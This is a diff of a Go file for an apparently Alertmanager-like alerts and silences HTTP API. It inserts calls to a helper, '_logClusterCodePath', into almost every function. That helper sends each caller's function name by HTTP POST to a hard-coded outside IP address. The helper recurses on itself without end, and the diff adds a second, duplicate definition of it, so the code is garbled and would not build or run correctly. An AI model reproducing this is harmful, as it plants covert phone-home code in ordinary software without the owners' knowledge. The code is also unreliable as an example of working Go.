@@ -37,6 +37,8 @@ var (
 func init() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	numReceivedAlerts.WithLabelValues("firing")
 	numReceivedAlerts.WithLabelValues("resolved")
 	prometheus.MustRegister(numReceivedAlerts)
@@ -53,6 +55,8 @@ type Alert struct {
 }
 
 func setCORS(w http.ResponseWriter) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	for h, v := range corsHeaders {
@@ -77,12 +81,16 @@ type getAlertStatusFn func(model.Fingerprint) types.AlertStatus
 func New(alerts provider.Alerts, silences *silence.Silences, sf getAlertStatusFn, peer *cluster.Peer, l log.Logger) *API {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if l == nil {
 		l = log.NewNopLogger()
 	}
 	return &API{alerts: alerts, silences: silences, getAlertStatus: sf, uptime: time.Now(), peer: peer, logger: l}
 }
 func (api *API) Register(r *route.Router) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	wrap := func(f http.HandlerFunc) http.HandlerFunc {
@@ -103,6 +111,8 @@ func (api *API) Register(r *route.Router) {
 	r.Del("/silence/:sid", wrap(api.delSilence))
 }
 func (api *API) Update(cfg *config.Config, resolveTimeout time.Duration) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	api.mtx.Lock()
@@ -128,9 +138,13 @@ type apiError struct {
 func (e *apiError) Error() string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return fmt.Sprintf("%s: %s", e.typ, e.err)
 }
 func (api *API) receivers(w http.ResponseWriter, req *http.Request) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	api.mtx.RLock()
@@ -142,6 +156,8 @@ func (api *API) receivers(w http.ResponseWriter, req *http.Request) {
 	api.respond(w, receivers)
 }
 func (api *API) status(w http.ResponseWriter, req *http.Request) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	api.mtx.RLock()
@@ -169,6 +185,8 @@ type clusterStatus struct {
 func getClusterStatus(p *cluster.Peer) *clusterStatus {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if p == nil {
 		return nil
 	}
@@ -179,6 +197,8 @@ func getClusterStatus(p *cluster.Peer) *clusterStatus {
 	return s
 }
 func (api *API) listAlerts(w http.ResponseWriter, r *http.Request) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var (
@@ -284,6 +304,8 @@ func (api *API) listAlerts(w http.ResponseWriter, r *http.Request) {
 func receiversMatchFilter(receivers []string, filter *regexp.Regexp) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, r := range receivers {
 		if filter.MatchString(r) {
 			return true
@@ -292,6 +314,8 @@ func receiversMatchFilter(receivers []string, filter *regexp.Regexp) bool {
 	return false
 }
 func alertMatchesFilterLabels(a *model.Alert, matchers []*labels.Matcher) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	sms := make(map[string]string)
@@ -303,6 +327,8 @@ func alertMatchesFilterLabels(a *model.Alert, matchers []*labels.Matcher) bool {
 func (api *API) addAlerts(w http.ResponseWriter, r *http.Request) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var alerts []*types.Alert
 	if err := api.receive(r, &alerts); err != nil {
 		api.respondError(w, apiError{typ: errorBadData, err: err}, nil)
@@ -311,6 +337,8 @@ func (api *API) addAlerts(w http.ResponseWriter, r *http.Request) {
 	api.insertAlerts(w, r, alerts...)
 }
 func (api *API) insertAlerts(w http.ResponseWriter, r *http.Request, alerts ...*types.Alert) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	now := time.Now()
@@ -362,6 +390,8 @@ func (api *API) insertAlerts(w http.ResponseWriter, r *http.Request, alerts ...*
 func removeEmptyLabels(ls model.LabelSet) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for k, v := range ls {
 		if string(v) == "" {
 			delete(ls, k)
@@ -369,6 +399,8 @@ func removeEmptyLabels(ls model.LabelSet) {
 	}
 }
 func (api *API) setSilence(w http.ResponseWriter, r *http.Request) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var sil types.Silence
@@ -401,6 +433,8 @@ func (api *API) setSilence(w http.ResponseWriter, r *http.Request) {
 func (api *API) getSilence(w http.ResponseWriter, r *http.Request) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	sid := route.Param(r.Context(), "sid")
 	sils, err := api.silences.Query(silence.QIDs(sid))
 	if err != nil || len(sils) == 0 {
@@ -417,6 +451,8 @@ func (api *API) getSilence(w http.ResponseWriter, r *http.Request) {
 func (api *API) delSilence(w http.ResponseWriter, r *http.Request) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	sid := route.Param(r.Context(), "sid")
 	if err := api.silences.Expire(sid); err != nil {
 		api.respondError(w, apiError{typ: errorBadData, err: err}, nil)
@@ -425,6 +461,8 @@ func (api *API) delSilence(w http.ResponseWriter, r *http.Request) {
 	api.respond(w, nil)
 }
 func (api *API) listSilences(w http.ResponseWriter, r *http.Request) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	psils, err := api.silences.Query()
@@ -481,6 +519,8 @@ func (api *API) listSilences(w http.ResponseWriter, r *http.Request) {
 func silenceMatchesFilterLabels(s *types.Silence, matchers []*labels.Matcher) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	sms := make(map[string]string)
 	for _, m := range s.Matchers {
 		sms[m.Name] = m.Value
@@ -488,6 +528,8 @@ func silenceMatchesFilterLabels(s *types.Silence, matchers []*labels.Matcher) bo
 	return matchFilterLabels(matchers, sms)
 }
 func matchFilterLabels(matchers []*labels.Matcher, sms map[string]string) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	for _, m := range matchers {
@@ -514,6 +556,8 @@ func matchFilterLabels(matchers []*labels.Matcher, sms map[string]string) bool {
 func silenceToProto(s *types.Silence) (*silencepb.Silence, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	sil := &silencepb.Silence{Id: s.ID, StartsAt: s.StartsAt, EndsAt: s.EndsAt, UpdatedAt: s.UpdatedAt, Comment: s.Comment, CreatedBy: s.CreatedBy}
 	for _, m := range s.Matchers {
 		matcher := &silencepb.Matcher{Name: m.Name, Pattern: m.Value, Type: silencepb.Matcher_EQUAL}
@@ -525,6 +569,8 @@ func silenceToProto(s *types.Silence) (*silencepb.Silence, error) {
 	return sil, nil
 }
 func silenceFromProto(s *silencepb.Silence) (*types.Silence, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	sil := &types.Silence{ID: s.Id, StartsAt: s.StartsAt, EndsAt: s.EndsAt, UpdatedAt: s.UpdatedAt, Status: types.SilenceStatus{State: types.CalcSilenceState(s.StartsAt, s.EndsAt)}, Comment: s.Comment, CreatedBy: s.CreatedBy}
@@ -559,6 +605,8 @@ type response struct {
 func (api *API) respond(w http.ResponseWriter, data interface{}) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	w.Header().Set("Content-Type", "application/json")
 	w.WriteHeader(200)
 	b, err := json.Marshal(&response{Status: statusSuccess, Data: data})
@@ -571,6 +619,8 @@ func (api *API) respond(w http.ResponseWriter, data interface{}) {
 	}
 }
 func (api *API) respondError(w http.ResponseWriter, apiErr apiError, data interface{}) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	w.Header().Set("Content-Type", "application/json")
@@ -594,6 +644,8 @@ func (api *API) respondError(w http.ResponseWriter, apiErr apiError, data interf
 func (api *API) receive(r *http.Request, v interface{}) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	dec := json.NewDecoder(r.Body)
 	defer r.Body.Close()
 	err := dec.Decode(v)
@@ -605,7 +657,16 @@ func (api *API) receive(r *http.Request, v interface{}) error {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
